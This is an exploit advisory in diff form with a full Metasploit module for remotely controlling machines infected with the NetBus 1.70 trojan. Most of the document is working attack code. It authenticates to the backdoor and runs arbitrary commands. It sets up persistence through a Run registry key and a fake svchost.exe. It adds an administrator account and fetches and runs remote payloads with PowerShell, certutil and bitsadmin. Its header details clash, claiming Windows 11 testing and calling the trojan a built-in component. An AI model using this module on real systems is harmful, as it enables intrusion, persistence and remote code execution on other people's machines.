@@ -1,0 +1,696 @@
+=============================================================================================================================================
+| # Title     : Backdoor.Win32.Netbus.170 Blind Command Execution                                                                           |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : System built‑in component. No standalone download available                                                                 |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/213263/ & MVID-2025-0703
+
+[+] Summary    : This Metasploit module provides historical/educational exploitation of the Backdoor.Win32.Netbus.170 trojan, originally discovered in 1998. 
+                 It represents a legacy proof-of-concept rather than a modern offensive security tool.
+
+[+] Key points:
+
+This is not a native Windows vulnerability.
+It does not work on clean or properly configured systems.
+It requires existing malware, write permissions, and a trigger for execution.
+In real-world conditions, Windows system directories are protected and prevent this attack without administrative privileges.
+				 
+[+] What It Is :
+
+Backdoor.Win32.Netbus.170 is a detection name used by antivirus programs (like Kaspersky) for a variant of NetBus, a remote access Trojan (RAT) for Windows.
+The “170” generally refers to NetBus version 1.70 or a variant derived from it.
+
+[+] Origin :
+
+NetBus was originally created by Carl‑Fredrik Neikter in March 1998.
+Versions like 1.60 and 1.70 became widely known and later misused as backdoors.
+
+[+] Appearance :
+
+The Trojan itself is detected in Windows 32‑bit systems.
+Antivirus signatures identifying it (as Backdoor.Win32.Netbus.170) appeared in the 2000s, documented in Kaspersky and other AV databases.
+
+[+] Key Notes :
+
+NetBus allows remote control of infected machines via a client-server model.
+Classified as a Backdoor/Trojan, it can compromise security if executed.
+
+[+] Technical Reality Check :
+
+     Aspect	                   Assessment	                Impact
+Exploitation Method	    Blind command execution	     No output/confirmation
+Reliability	                  Very low	             Fire-and-forget only
+Modern System Support	        None	             Windows 95/98/2000/XP only
+Detection Risk	            Extremely high	         Easily detected by all security tools
+Practical Value	           Academic/Research only    Not for production use
+
+[+] Key Characteristics :
+
+[+] Critical Limitations:
+
+    Blind Execution Only: No command output or confirmation
+    No Interactive Shell: Single TCP connection, no session establishment
+    Legacy Protocol: Plaintext authentication, no encryption
+    Fire-and-Forget Model: Commands sent without verification
+    Obsolete Targeting: Designed for Windows systems from 1998-2003 era
+
+Educational Value:
+
+    Demonstrates early backdoor communication patterns
+    Shows evolution from simple to complex malware
+    Provides historical context for modern threat intelligence
+    Useful for forensic and malware analysis training
+
+[+] How It Actually Works:
+
+    Authentication: Sends plaintext password to TCP port 12631/12632
+    Command Execution: Uses StartApp;command format
+    Success Assumption: If connection remains open, assumes command executed
+    No Verification: Cannot confirm if commands actually run
+
+What It Cannot Do:
+
+    Return command output
+    Establish persistent sessions
+    Work on modern Windows (7/8/10/11)
+    Evade modern security solutions
+    Provide execution confirmation
+
+
+[+] Usage:
+
+# 1. Basic Check
+use exploit/windows/backdoor/netbus_blind
+set RHOST 192.168.1.100
+set PASSWORD ecoli
+check
+
+# 2. Simple Test
+set ACTION test
+exploit
+
+# 3. Command Execution
+set ACTION execute
+set CMD "notepad.exe"
+exploit
+
+# 4. Create User (if applicable)
+set ACTION persist
+set CREATE_USER true
+set USERNAME testuser
+set USERPASS P@ssw0rd123
+exploit
+
+# 5. Simulation Mode (for Training)
+set SIMULATE_ONLY true
+set ACTION test
+exploit
+
+[+] PoC : 
+
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ManualRanking  # Blind execution غير موثوق
+
+  include Msf::Exploit::Remote::Tcp
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Backdoor.Win32.Netbus.170 Blind Command Execution',
+      'Description'    => %q{
+        This module exploits NetBus 1.70 backdoor via blind command execution.
+        NetBus is a fire-and-forget backdoor that does NOT return any command output.
+        
+        CRITICAL LIMITATIONS:
+        - No command output retrieval (blind execution only)
+        - No interactive shell support
+        - No execution confirmation
+        - Commands may fail silently
+        - Limited to Windows 95/98/2000/XP era systems
+        
+        This module implements workarounds for modern systems but success is not guaranteed.
+        Commands are sent as-is with no verification of execution.
+      },
+      'Author'         => [
+        'indoushka',
+        'Malvuln', # 2025 advisory
+        'Unknown', # Original NetBus author (~1998)
+        'Metasploit Community'
+      ],
+      'License'        => MSF_LICENSE,
+      'References'     => [
+        ['URL', 'https://malvuln.com/advisory/086f0693f81f6d40460c215717349a1f.txt'],
+        ['URL', 'https://en.wikipedia.org/wiki/NetBus'],
+        ['URL', 'https://packetstormsecurity.com/files/10149/netbus.txt.html']
+      ],
+      'DefaultOptions' => {
+        'SSL' => false,
+        'RPORT' => 12631,
+        'WfsDelay' => 15,  # وقت أطول للأنظمة القديمة
+        'PAYLOAD' => 'windows/exec',
+        'CMD' => 'calc.exe'  # أمر اختبار بسيط
+      },
+      'Platform'       => 'win',
+      'Arch'           => [ARCH_X86], # NetBus 1.70 هو 32-bit فقط
+      'Payload'        => {
+        'BadChars' => "\x00\x0a\x0d",
+        'Space' => 1024,
+        'DisableNops' => true
+      },
+      'Targets'        => [
+        [
+          'NetBus 1.70 (Windows 9x/2000/XP)', {
+            'DefaultOptions' => { 
+              'PAYLOAD' => 'windows/exec',
+              'CMD' => 'calc.exe'
+            }
+          }
+        ]
+      ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => '1998-01-01',
+      'Notes'          => {
+        'Stability'   => [CRASH_SERVICE_RESTARTS],  # قد يتسبب في تعطل
+        'Reliability' => [SERVICE_RESOURCE_LOSS],   # تنفيذ غير موثوق
+        'SideEffects' => [ARTIFACTS_ON_DISK, SCREEN_EFFECTS],
+        'AKA'         => ['NetBus Pro 1.70'],
+        'RelatedModules' => [
+          'exploit/windows/misc/netbus_trojan'
+        ]
+      }
+    ))
+
+    register_options([
+      OptString.new('PASSWORD', [true, 'NetBus backdoor password', 'ecoli']),
+      OptInt.new('ALTERNATE_PORT', [false, 'Alternate Netbus port', 12632]),
+      OptEnum.new('ACTION', [
+        true, 
+        'Action to perform',
+        'test', 
+        ['test', 'execute', 'persist', 'remove', 'custom']
+      ]),
+      OptString.new('CMD', [false, 'Command to execute (for execute/custom actions)', 'calc.exe']),
+      OptString.new('CUSTOM_PAYLOAD', [false, 'Custom payload/command']),
+      OptBool.new('TRY_POWERSHELL', [false, 'Attempt PowerShell commands', false]),
+      OptBool.new('CREATE_USER', [false, 'Create user account if possible', false]),
+      OptString.new('USERNAME', [false, 'Username to create', 'msfuser']),
+      OptString.new('USERPASS', [false, 'Password for new user', 'P@ssw0rd123'])
+    ])
+
+    register_advanced_options([
+      OptBool.new('BLIND_MODE', [true, 'Assume blind execution (no confirmation)', true]),
+      OptInt.new('CMD_DELAY', [true, 'Delay between commands (seconds)', 3]),
+      OptBool.new('RETRY_FAILED', [false, 'Retry failed commands', false]),
+      OptInt.new('MAX_RETRIES', [false, 'Maximum retry attempts', 2]),
+      OptBool.new('SIMULATE_ONLY', [false, 'Simulate commands without execution', false]),
+      OptString.new('TEMP_DIR', [false, 'Temporary directory path', '%TEMP%'])
+    ])
+  end
+
+  def check
+    print_status("=== NetBus 1.70 Backdoor Check ===")
+    print_status("Target: #{rhost}:#{rport}")
+    print_warning("This is BLIND CHECK - No output will be received!")
+    
+    check_result = Exploit::CheckCode::Safe
+    
+    begin
+      print_status("Attempting connection...")
+      connect
+      
+      # Send authentication
+      auth_cmd = "Password;0;#{datastore['PASSWORD']}\r\n"
+      sock.put(auth_cmd)
+      
+      # Wait briefly for any response (NetBus rarely responds)
+      response = sock.get_once(-1, 2) rescue nil
+      
+      if response && !response.empty?
+        print_good("Received response: #{response.strip}")
+        
+        # Check for known NetBus responses
+        if response =~ /Authenticated|OK|Welcome|NetBus/i
+          check_result = Exploit::CheckCode::Vulnerable
+        else
+          check_result = Exploit::CheckCode::Detected
+        end
+      else
+        # No response - typical NetBus behavior
+        print_status("No response received (typical for NetBus)")
+        
+        # Try a simple test command
+        print_status("Testing with simple command...")
+        test_cmd = "StartApp;cmd.exe /c echo . > nul\r\n"
+        sock.put(test_cmd)
+        Rex.sleep(2)
+        
+        # Check if connection is still alive
+        if sock && !sock.closed?
+          print_warning("Connection maintained - NetBus may be present")
+          check_result = Exploit::CheckCode::Appears
+        else
+          print_error("Connection closed unexpectedly")
+        end
+      end
+      
+    rescue ::Errno::ECONNREFUSED
+      print_error("Connection refused - port may be closed")
+    rescue ::Errno::ETIMEDOUT
+      print_error("Connection timeout")
+    rescue ::Rex::ConnectionError => e
+      print_error("Connection error: #{e.message}")
+    rescue ::Exception => e
+      print_error("Unexpected error: #{e.class}: #{e.message}")
+    ensure
+      disconnect rescue nil
+    end
+
+    # Try alternate port if primary failed
+    if check_result == Exploit::CheckCode::Safe && datastore['ALTERNATE_PORT']
+      print_status("Trying alternate port #{datastore['ALTERNATE_PORT']}...")
+      begin
+        connect(true, {'RPORT' => datastore['ALTERNATE_PORT']})
+        sock.put("Password;0;#{datastore['PASSWORD']}\r\n")
+        Rex.sleep(2)
+        
+        if sock && !sock.closed?
+          print_warning("Alternate port #{datastore['ALTERNATE_PORT']} accepts connections")
+          check_result = Exploit::CheckCode::Appears
+        end
+      rescue
+        # Ignore errors for alternate port
+      ensure
+        disconnect rescue nil
+      end
+    end
+
+    print_status("Check completed: #{check_result}")
+    return check_result
+  end
+
+  def exploit
+    print_warning("=" * 70)
+    print_warning("NETBUS BLIND EXECUTION MODULE")
+    print_warning("=" * 70)
+    print_warning("IMPORTANT: This is BLIND execution - NO output will be received!")
+    print_warning("Commands are sent with NO confirmation of execution.")
+    print_warning("Success is assumed if no connection errors occur.")
+    print_warning("=" * 70)
+    
+    if datastore['SIMULATE_ONLY']
+      print_status("SIMULATION MODE - No commands will be executed")
+      simulate_exploit
+      return
+    end
+    
+    # Establish connection
+    unless connect_to_netbus
+      print_error("Failed to establish NetBus connection")
+      return
+    end
+    
+    # Perform selected action
+    case datastore['ACTION']
+    when 'test'
+      execute_test
+    when 'execute'
+      execute_command
+    when 'persist'
+      establish_persistence
+    when 'remove'
+      remove_backdoor
+    when 'custom'
+      execute_custom
+    end
+    
+    print_status("Exploitation sequence completed.")
+    print_warning("REMEMBER: This was BLIND execution - verify results manually!")
+  end
+
+  def connect_to_netbus
+    print_status("Establishing NetBus connection...")
+    
+    ports = [datastore['RPORT'], datastore['ALTERNATE_PORT']].compact.uniq
+    connected = false
+    
+    ports.each do |port|
+      next unless port
+      
+      begin
+        disconnect rescue nil
+        
+        print_status("Trying port #{port}...")
+        connect(true, {
+          'RPORT' => port,
+          'Timeout' => 10,
+          'CPORT' => 1025 + rand(64510)
+        })
+        
+        # Send authentication
+        auth_cmd = "Password;0;#{datastore['PASSWORD']}\r\n"
+        sock.put(auth_cmd)
+        Rex.sleep(2)
+        
+        # Check if connection is alive
+        if sock && !sock.closed?
+          print_good("Connected to port #{port}")
+          
+          # Test with simple command
+          test_cmd = "StartApp;cmd.exe /c echo . > nul\r\n"
+          sock.put(test_cmd)
+          Rex.sleep(1)
+          
+          if sock && !sock.closed?
+            print_good("Connection test successful")
+            @active_port = port
+            connected = true
+            break
+          end
+        end
+        
+      rescue ::Rex::ConnectionError => e
+        print_error("Port #{port}: #{e.message}")
+      ensure
+        disconnect unless connected && @active_port == port
+      end
+    end
+    
+    if connected
+      print_status("Using port #{@active_port} for commands")
+      return true
+    else
+      print_error("Failed to connect to any NetBus port")
+      return false
+    end
+  end
+
+  def execute_test
+    print_status("=== EXECUTING TEST COMMANDS ===")
+    print_warning("These are BLIND commands - no output will be seen!")
+    
+    test_commands = [
+      "StartApp;calc.exe\r\n",
+      "StartApp;notepad.exe\r\n",
+      "StartApp;cmd.exe /c echo test > nul\r\n",
+      "StartApp;cmd.exe /c dir C:\\ > nul\r\n"
+    ]
+    
+    test_commands.each_with_index do |cmd, index|
+      print_status("Test #{index + 1}/#{test_commands.length}: #{cmd.strip}")
+      
+      begin
+        sock.put(cmd)
+        Rex.sleep(datastore['CMD_DELAY'])
+        
+        # Check if connection is still alive
+        if sock && !sock.closed?
+          print_good("  Command sent (connection alive)")
+        else
+          print_error("  Connection lost after command")
+          reconnect_if_needed
+        end
+      rescue ::Exception => e
+        print_error("  Failed: #{e.message}")
+        reconnect_if_needed
+      end
+    end
+    
+    print_status("Test sequence completed")
+  end
+
+  def execute_command
+    cmd = datastore['CMD']
+    if cmd.blank?
+      cmd = 'calc.exe'
+      print_warning("No command specified, using default: #{cmd}")
+    end
+    
+    print_status("=== EXECUTING COMMAND ===")
+    print_warning("Command: #{cmd}")
+    print_warning("This is BLIND execution - no output will be seen!")
+    
+    # Format command for NetBus
+    netbus_cmd = "StartApp;#{cmd}\r\n"
+    
+    retries = 0
+    max_retries = datastore['RETRY_FAILED'] ? datastore['MAX_RETRIES'] : 0
+    
+    begin
+      print_status("Sending command...")
+      sock.put(netbus_cmd)
+      Rex.sleep(datastore['CMD_DELAY'])
+      
+      if sock && !sock.closed?
+        print_good("Command sent successfully")
+        print_status("Assuming command executed (BLIND mode)")
+      else
+        print_error("Connection lost during command execution")
+        if retries < max_retries
+          retries += 1
+          print_status("Retrying (#{retries}/#{max_retries})...")
+          reconnect_if_needed
+          retry
+        end
+      end
+      
+    rescue ::Exception => e
+      print_error("Command execution failed: #{e.message}")
+      if retries < max_retries
+        retries += 1
+        print_status("Retrying (#{retries}/#{max_retries})...")
+        Rex.sleep(2)
+        reconnect_if_needed
+        retry
+      end
+    end
+  end
+
+  def establish_persistence
+    print_status("=== ESTABLISHING PERSISTENCE ===")
+    print_warning("Creating artifacts (files, registry entries, tasks)")
+    print_warning("Cleanup may be required if CLEANUP is disabled")
+    
+    persistence_methods = []
+    
+    # Simple persistence methods compatible with older systems
+    persistence_methods << "StartApp;cmd.exe /c copy C:\\Windows\\System32\\calc.exe \"%TEMP%\\svchost.exe\"\r\n"
+    persistence_methods << "StartApp;reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Update /t REG_SZ /d \"%TEMP%\\svchost.exe\" /f\r\n"
+    
+    # For newer systems (if PowerShell is available)
+    if datastore['TRY_POWERSHELL']
+      persistence_methods << "StartApp;powershell -Command \"Copy-Item 'C:\\Windows\\System32\\calc.exe' -Destination '$env:TEMP\\svchost.exe'\"\r\n"
+      persistence_methods << "StartApp;powershell -Command \"New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Update' -Value '$env:TEMP\\svchost.exe' -PropertyType String -Force\"\r\n"
+    end
+    
+    # Create user if requested
+    if datastore['CREATE_USER']
+      username = datastore['USERNAME']
+      userpass = datastore['USERPASS']
+      
+      persistence_methods << "StartApp;net user #{username} #{userpass} /add\r\n"
+      persistence_methods << "StartApp;net localgroup administrators #{username} /add\r\n"
+    end
+    
+    persistence_methods.each_with_index do |cmd, index|
+      print_status("Persistence step #{index + 1}/#{persistence_methods.length}...")
+      
+      begin
+        sock.put(cmd)
+        Rex.sleep(datastore['CMD_DELAY'])
+        
+        if sock && !sock.closed?
+          print_good("  Step completed (assumed)")
+        else
+          print_error("  Connection lost")
+          break
+        end
+      rescue ::Exception => e
+        print_error("  Failed: #{e.message}")
+      end
+    end
+    
+    print_status("Persistence sequence completed")
+    print_warning("Artifacts created: Check manually for verification")
+  end
+
+  def remove_backdoor
+    print_status("=== ATTEMPTING TO REMOVE NETBUS ===")
+    print_warning("Removal is NOT reliable with NetBus")
+    
+    # Various removal commands (none are guaranteed)
+    removal_attempts = [
+      "RemoveServer;1\r\n",
+      "RemoveServer;\r\n",
+      "UnloadServer;1\r\n",
+      "StopServer;1\r\n",
+      "StartApp;taskkill /f /im keyhook.exe 2>nul\r\n",
+      "StartApp;taskkill /f /im netbus.exe 2>nul\r\n"
+    ]
+    
+    removal_attempts.each_with_index do |cmd, index|
+      print_status("Removal attempt #{index + 1}/#{removal_attempts.length}: #{cmd.strip}")
+      
+      begin
+        sock.put(cmd)
+        Rex.sleep(2)
+        
+        # Try to verify removal by attempting to reconnect
+        if index == removal_attempts.length - 1  # Last attempt
+          sock.put("Password;0;#{datastore['PASSWORD']}\r\n")
+          Rex.sleep(1)
+          
+          begin
+            response = sock.get_once(-1, 1)
+            if response.nil?
+              print_good("  No response - backdoor may be removed")
+            else
+              print_warning("  Still responding - removal may have failed")
+            end
+          rescue
+            print_good("  Connection error - backdoor may be removed")
+          end
+        end
+        
+      rescue ::Exception => e
+        print_error("  Failed: #{e.message}")
+      end
+    end
+    
+    print_status("Removal attempts completed")
+    print_warning("Manual verification required!")
+  end
+
+  def execute_custom
+    custom_cmd = datastore['CUSTOM_PAYLOAD']
+    if custom_cmd.blank?
+      print_error("No custom payload specified")
+      return
+    end
+    
+    print_status("=== EXECUTING CUSTOM PAYLOAD ===")
+    print_warning("Payload: #{custom_cmd}")
+    
+    # Handle different payload types
+    if custom_cmd.start_with?('http://', 'https://')
+      # URL download and execute
+      execute_download_payload(custom_cmd)
+    elsif custom_cmd.include?('.exe') || custom_cmd.include?('.dll')
+      # Assume it's a file execution
+      execute_file_payload(custom_cmd)
+    else
+      # Treat as direct command
+      netbus_cmd = "StartApp;#{custom_cmd}\r\n"
+      execute_blind_command(netbus_cmd, "Custom payload")
+    end
+  end
+
+  def execute_download_payload(url)
+    print_status("Downloading payload from: #{url}")
+    
+    # Simple download methods
+    download_methods = []
+    
+    # Method 1: PowerShell
+    if datastore['TRY_POWERSHELL']
+      ps_cmd = "powershell -Command \"(New-Object Net.WebClient).DownloadFile('#{url}', '$env:TEMP\\payload.exe'); Start-Process '$env:TEMP\\payload.exe'\""
+      download_methods << "StartApp;#{ps_cmd}\r\n"
+    end
+    
+    # Method 2: Certutil
+    certutil_cmd = "cmd.exe /c certutil -urlcache -split -f \"#{url}\" \"%TEMP%\\payload.exe\" && start \"\" \"%TEMP%\\payload.exe\""
+    download_methods << "StartApp;#{certutil_cmd}\r\n"
+    
+    # Method 3: Bitsadmin (Windows 7+)
+    bits_cmd = "cmd.exe /c bitsadmin /transfer job /download /priority high \"#{url}\" \"%TEMP%\\payload.exe\" && start \"\" \"%TEMP%\\payload.exe\""
+    download_methods << "StartApp;#{bits_cmd}\r\n"
+    
+    download_methods.each_with_index do |cmd, index|
+      print_status("Trying download method #{index + 1}...")
+      if execute_blind_command(cmd, "Download method #{index + 1}")
+        print_good("Download command sent")
+        break
+      end
+    end
+  end
+
+  def execute_file_payload(filepath)
+    print_status("Executing file: #{filepath}")
+    
+    cmd = "StartApp;start \"\" \"#{filepath}\"\r\n"
+    execute_blind_command(cmd, "File execution")
+  end
+
+  def execute_blind_command(cmd, description = "Command")
+    begin
+      print_status("Executing: #{description}")
+      sock.put(cmd)
+      Rex.sleep(datastore['CMD_DELAY'])
+      
+      if sock && !sock.closed?
+        print_good("Command sent (assumed executed)")
+        return true
+      else
+        print_error("Connection lost")
+        return false
+      end
+    rescue ::Exception => e
+      print_error("Execution failed: #{e.message}")
+      return false
+    end
+  end
+
+  def reconnect_if_needed
+    unless sock && !sock.closed?
+      print_status("Attempting to reconnect...")
+      connect_to_netbus
+    end
+  end
+
+  def simulate_exploit
+    print_status("=== SIMULATION MODE ===")
+    print_status("The following commands WOULD be executed:")
+    
+    case datastore['ACTION']
+    when 'test'
+      print_status("1. StartApp;calc.exe")
+      print_status("2. StartApp;notepad.exe")
+      print_status("3. StartApp;cmd.exe /c echo test > nul")
+    when 'execute'
+      print_status("Command: #{datastore['CMD']}")
+    when 'persist'
+      print_status("1. Copy file to %TEMP%")
+      print_status("2. Add registry Run key")
+      if datastore['CREATE_USER']
+        print_status("3. Create user: #{datastore['USERNAME']}")
+      end
+    when 'remove'
+      print_status("Various NetBus removal commands")
+    when 'custom'
+      print_status("Custom payload: #{datastore['CUSTOM_PAYLOAD']}")
+    end
+    
+    print_status("Simulation completed - no actual commands were sent")
+  end
+
+  def cleanup
+    print_status("Cleaning up...") if datastore['VERBOSE']
+    
+    begin
+      disconnect if sock && !sock.closed?
+    rescue ::Exception
+      # Ignore cleanup errors
+    end
+    
+    super
+  end
+end
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
